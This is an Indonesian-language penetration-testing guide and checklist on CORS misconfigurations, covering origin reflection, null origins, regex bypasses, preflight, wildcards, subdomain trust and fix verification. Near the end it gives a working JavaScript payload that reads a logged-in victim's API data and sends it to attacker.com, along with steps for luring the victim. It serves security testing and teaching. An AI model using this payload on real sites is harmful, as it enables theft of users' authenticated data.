# Cross-Origin Resource Sharing (CORS)

> credit: Deepseek

## Daftar Isi
- [1. Pengertian Kerentanan CORS](#1-pengertian-kerentanan-cors)
- [2. Cara Kerja CORS](#2-cara-kerja-cors)
- [3. Karakteristik Kesalahan Konfigurasi CORS](#3-karakteristik-kesalahan-konfigurasi-cors)
- [4. Cara Menemukan dan Mendeteksi Masalah CORS](#4-cara-menemukan-dan-mendeteksi-masalah-cors)
- [5. Daftar Periksa Pengujian CORS](#5-daftar-periksa-pengujian-cors)
  - [5.1 Refleksi Origin](#51-refleksi-origin)
  - [5.2 Penanganan Kredensial](#52-penanganan-kredensial)
  - [5.3 Penanganan Preflight](#53-penanganan-preflight)
  - [5.4 Penggunaan Wildcard](#54-penggunaan-wildcard)
  - [5.5 Kepercayaan Subdomain](#55-kepercayaan-subdomain)
  - [5.6 Penilaian Dampak](#56-penilaian-dampak)
  - [5.7 Verifikasi Perbaikan](#57-verifikasi-perbaikan)
- [6. Pertimbangan Teknis Tambahan](#6-pertimbangan-teknis-tambahan)

---

## 1. Pengertian Kerentanan CORS

**CORS (Cross-Origin Resource Sharing)** adalah mekanisme yang memungkinkan server web secara eksplisit mengizinkan permintaan lintas-asal dari domain tertentu. Kerentanan CORS muncul ketika server salah dikonfigurasi sehingga memercayai **asal yang tidak diverifikasi atau dikendalikan penyerang**, akibatnya Same-Origin Policy (SOP) dilanggar dan situs jahat dapat membaca data sensitif atau melakukan perubahan state atas nama korban.

**Dampak umum**:
- Pencurian kunci API, token CSRF, atau data pengguna.
- Pengambilalihan akun (jika cookie sesi terekspos).
- Eskalasi hak akses melalui panggilan API internal.

## 2. Cara Kerja CORS

Permintaan lintas-asal (misal dari `attacker.com` ke `api.target.com`) menyebabkan browser mengirimkan header **Origin**. Server merespons dengan:

- `Access-Control-Allow-Origin: <origin>` – menentukan asal mana yang diizinkan.
- `Access-Control-Allow-Credentials: true` – mengizinkan cookie/header otorisasi disertakan.
- `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers` – digunakan saat preflight.

Jika `Access-Control-Allow-Origin` yang dikembalikan sama dengan (atau mencerminkan) asal peminta **dan** browser mengizinkannya, respons tersebut dibagikan lintas-asal.

**Pola rentan**: Server secara membabi buta menyalin nilai `Origin`, misalnya `Access-Control-Allow-Origin: https://attacker.com`.

## 3. Karakteristik Kesalahan Konfigurasi CORS

| Karakteristik | Deskripsi |
|---------------|-----------|
| **Refleksi Origin** | Nilai `Access-Control-Allow-Origin` disalin secara dinamis dari header `Origin` tanpa validasi. |
| **Penerimaan null origin** | `Origin: null` diizinkan (dapat dipalsukan oleh iframe ter-sandbox atau file lokal). |
| **Wildcard dengan kredensial** | `Access-Control-Allow-Origin: *` bersama `Access-Control-Allow-Credentials: true` – tidak sah menurut spesifikasi tetapi beberapa server salah mengimplementasikannya. |
| **Regex subdomain yang lemah** | Memercayai `*.target.com` tetapi menggunakan pencocokan pola lemah (misal `target.com$` → `attackertarget.com`). |
| **Penurunan protokol** | Menerima `http://` padahal aplikasi menggunakan HTTPS. |
| **Salah konfigurasi preflight** | Mengizinkan metode berbahaya (`PUT`, `DELETE`) atau header (`X-Custom-Auth`) tanpa validasi ketat. |

## 4. Cara Menemukan dan Mendeteksi Masalah CORS

### Pengujian Manual (DevTools Browser + cURL)

1. **Intersep permintaan** ke endpoint target yang mengembalikan data sensitif (contoh: `/api/user`).
2. **Ubah header `Origin`** dalam permintaan ulang (menggunakan Burp Repeater, Postman, atau cURL):
   ```bash
   curl -X GET https://api.target.com/user \
     -H "Origin: https://attacker.com" \
     -H "Cookie: session=xyz" \
     -v
   ```
3. **Periksa header respons**:
   - `Access-Control-Allow-Origin: https://attacker.com` → terjadi refleksi.
   - `Access-Control-Allow-Credentials: true` → kredensial diizinkan.
   - Jika keduanya ada dan asal yang direfleksikan cocok dengan asal penyerang, endpoint tersebut rentan.

### Alat Otomatis

- **Burp Suite** – ekstensi pemindai CORS (misal CORS Scanner, CORS Misconfiguration).
- **ZAP** – aturan pemindaian aktif/pasif untuk CORS.
- **Skrip kustom** – kirim sekumpulan asal (contoh: `null`, `https://evil.com`, `http://target.com.evil.com`).

### Daftar Deteksi untuk Penguji Penetrasi

- Apakah server merefleksikan nilai `Origin` apa pun?
- Apakah server menerima `Origin: null`?
- Apakah `Access-Control-Allow-Credentials` dikembalikan bersama origin yang direfleksikan atau wildcard?
- Apakah ada respons preflight yang mengizinkan header/metode kustom secara sembarangan?
- Apakah pola origin yang dipercaya rentan terhadap injeksi prefiks/sufiks?

---

## 5. Daftar Periksa Pengujian CORS

*Gunakan kotak centang berikut selama pengujian. Setiap item menyertakan detail teknis dan upaya bypass.*

### 5.1 Refleksi Origin
- **Refleksi origin sembarang?**  
  Kirim `Origin: https://evil.com`. Jika `Access-Control-Allow-Origin: https://evil.com` kembali, situs mana pun dapat membaca respons.

- **Null origin diterima?**  
  Kirim `Origin: null`. Jika `Access-Control-Allow-Origin: null` kembali, eksploitasi melalui iframe ter-sandbox:  
  `<iframe sandbox="allow-scripts allow-forms" src="data:text/html,<script>...</script>"></iframe>`

- **Pencocokan subdomain (bypass regex)?**  
  Jika server memercayai `*.target.com`, coba:  
  `Origin: https://target.com.attacker.com`  
  `Origin: https://attackertarget.com` (jika regex-nya `target\.com$`)

- **Penurunan protokol (https→http)?**  
  Kirim `Origin: http://evil.com` ke endpoint HTTPS. Jika diizinkan, serangan MITM dapat mengeksploitasi.

- **Injeksi path/port?**  
  `Origin: https://target.com@evil.com`  
  `Origin: https://target.com:8080` (jika port diabaikan dalam validasi)

### 5.2 Penanganan Kredensial
- **Allow-Credentials: true?**  
  Cari `Access-Control-Allow-Credentials: true` dalam respons. Ini mengizinkan cookie dikirim lintas-asal.

- **Dikombinasikan dengan origin refleksi?**  
  `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` → **kerentanan kritis** (pencurian data terotentikasi).

- **Cookie dikirim lintas-asal?**  
  Verifikasi dengan halaman uji yang mengatur `withCredentials = true` pada XHR/fetch. Periksa apakah browser benar-benar menyertakan cookie dan menerima respons.

### 5.3 Penanganan Preflight
- **Metode kustom diizinkan?**  
  Kirim permintaan `OPTIONS` dengan `Access-Control-Request-Method: PATCH`. Jika respons menyertakan `PATCH` dalam `ACA-Methods`, penyerang dapat menggunakannya.

- **Header kustom diizinkan?**  
  `Access-Control-Request-Headers: X-Custom` – jika diterima, penyerang dapat menyuntikkan header yang mungkin melewati pemeriksaan sisi server.

- **Max-Age terlalu panjang?**  
  `Access-Control-Max-Age` > 86400 (24 jam) memungkinkan preflight di-cache sekali saja, mengurangi kesempatan perangkat keamanan mendeteksi permintaan jahat berikutnya.

- **Bypass preflight mungkin?**  
  Beberapa endpoint merefleksikan `Access-Control-Allow-Origin` hanya pada preflight tetapi tidak pada permintaan aktual – uji keduanya. Juga periksa apakah permintaan sederhana (GET/HEAD tanpa header kustom) melewatkan preflight sama sekali.

### 5.4 Penggunaan Wildcard
- **Access-Control-Allow-Origin: \***  
  Periksa apakah ada endpoint yang merespons dengan `Access-Control-Allow-Origin: *`. Ini sendiri aman, tetapi **berbahaya** jika dikombinasikan dengan `Access-Control-Allow-Credentials: true` (tidak sah menurut spesifikasi, tetapi beberapa server tetap mengirimkannya).

- **Wildcard dengan endpoint sensitif?**  
  Bahkan tanpa kredensial, API publik yang mengembalikan PII dengan wildcard dapat dieksploitasi oleh situs mana pun.

- **API internal dengan wildcard?**  
  Endpoint internal (misal `https://internal.corp/api`) yang terekspos ke internet dengan `Access-Control-Allow-Origin: *` memungkinkan halaman eksternal membacanya jika korban berada di jaringan korporat (serangan DNS rebinding atau jaringan lokal).

### 5.5 Kepercayaan Subdomain
- **\*.target.com dipercaya?**  
  Jika `Access-Control-Allow-Origin: *.target.com` diatur, maka subdomain mana pun (termasuk yang rentan XSS) dapat membaca respons.

- **Ada subdomain yang rentan XSS?**  
  Lakukan enumerasi subdomain (contoh: `dev.target.com`, `admin.target.com`). Jika salah satu memiliki XSS, XSS tersebut dapat mengirim permintaan terotentikasi ke API mana pun yang memercayai `*.target.com`.

- **Pengambilalihan subdomain mungkin?**  
  Jika subdomain (contoh: `old.target.com`) tidak digunakan tetapi CNAME-nya menunjuk ke layanan eksternal (GitHub Pages, AWS S3) yang dapat diklaim, penyerang dapat menghosting kode di sana dan mengeksploitasi kepercayaan tersebut.

### 5.6 Penilaian Dampak
- **Data apa yang dapat diakses?**  
  Identifikasi semua endpoint dengan kesalahan konfigurasi CORS – periksa `/user/profile`, `/account/balance`, `/api/private`, dll.

- **Dapatkah state diubah?**  
  Uji metode tidak aman (POST, PUT, DELETE) dengan kebijakan CORS yang salah konfigurasi. Jika diizinkan, penyerang dapat melakukan tindakan seperti CSRF tanpa preflight atau dengan permintaan sederhana.

- **Pencurian token/kredensial?**  
  Periksa apakah respons menyertakan token CSRF, kunci API, pengidentifikasi sesi, atau informasi pribadi.

- **Dikombinasikan dengan kerentanan lain?**  
  - CORS + kebocoran token CSRF → melewati perlindungan CSRF.  
  - CORS + XSS pada origin yang dipercaya → pengambilalihan akun penuh.  
  - CORS + cache poisoning (misal `Access-Control-Allow-Origin: *` dengan CDN) → dampak luas.

### 5.7 Verifikasi Perbaikan
- **Whitelist origin yang dipercaya?**  
  Verifikasi bahwa server mengembalikan `Access-Control-Allow-Origin` hanya untuk daftar origin yang diizinkan (contoh: `https://target.com`, `https://app.target.com`), tidak merefleksikan input sembarang.

- **Header Vary: Origin ada?**  
  Header respons `Vary: Origin` memastikan respons yang di-cache dipisahkan berdasarkan asal, mencegah cache poisoning.

- **Kredensial hanya dengan origin spesifik?**  
  `Access-Control-Allow-Credentials: true` tidak boleh pernah dikembalikan bersama `Access-Control-Allow-Origin: *` atau origin refleksi yang tidak masuk whitelist ketat.

- **Tidak ada wildcard untuk endpoint terotentikasi?**  
  Endpoint mana pun yang memerlukan autentikasi harus mengembalikan origin spesifik, bukan `*`.

- **Validasi preflight ketat?**  
  `ACA-Methods` dan `ACA-Headers` harus mencantumkan hanya yang benar-benar diperlukan, bukan `*`.

---

## 6. Pertimbangan Teknis Tambahan

### Bypass Preflight melalui “Permintaan Sederhana”
Permintaan lintas-asal dianggap **sederhana** (tanpa preflight) jika:
- Metode `GET`, `HEAD`, atau `POST`.
- Hanya header sederhana (`Accept`, `Accept-Language`, `Content-Language`, `Content-Type` dengan nilai `application/x-www-form-urlencoded`, `multipart/form-data`, atau `text/plain`).
- Tidak ada header kustom.

Oleh karena itu, meskipun preflight ketat, endpoint rentan dengan refleksi `Access-Control-Allow-Origin` tetap dapat dieksploitasi melalui form POST sederhana.

### Bahaya Origin `null`
Origin `null` dapat dihasilkan oleh:
- Iframe ter-sandbox (`sandbox="allow-scripts"`).
- File HTML lokal (`file://`).
- Data URL.
Beberapa server secara membabi buta memasukkan `null` ke whitelist untuk kemudahan, sehingga iframe ter-sandbox dapat mengeksfiltrasi data.

### CORS vs CSRF
- **CORS** berkaitan dengan membaca respons lintas-asal (melanggar SOP).
- **CSRF** berkaitan dengan permintaan perubahan state (yang secara default diizinkan, tetapi respons tidak dapat dibaca).
Ketika kesalahan konfigurasi CORS mengizinkan pembacaan respons, sering kali hal itu meningkatkan kerentanan CSRF menjadi pencurian data penuh.

### Cara Eksploitasi dalam Pengujian Nyata
1. Buat halaman HTML berisi:
   ```html
   <script>
     fetch('https://vulnerable.target.com/api/user', {
       credentials: 'include'
     }).then(r => r.text()).then(data => fetch('https://attacker.com/steal?data='+btoa(data)))
   </script>
   ```
2. Bujuk korban yang sudah login untuk membuka halaman tersebut.
3. Amati data yang dicuri tiba di server Anda.

### Deteksi Menggunakan Konsol Browser
Buka konsol browser korban (jika Anda bisa) dan jalankan:
```javascript
fetch('https://api.target.com/endpoint', {credentials: 'include'})
  .then(r => console.log(r.headers.get('access-control-allow-origin')));
```
Jika menampilkan `*` atau `null` atau asal Anda sendiri, kebijakan tersebut bersifat refleksif.
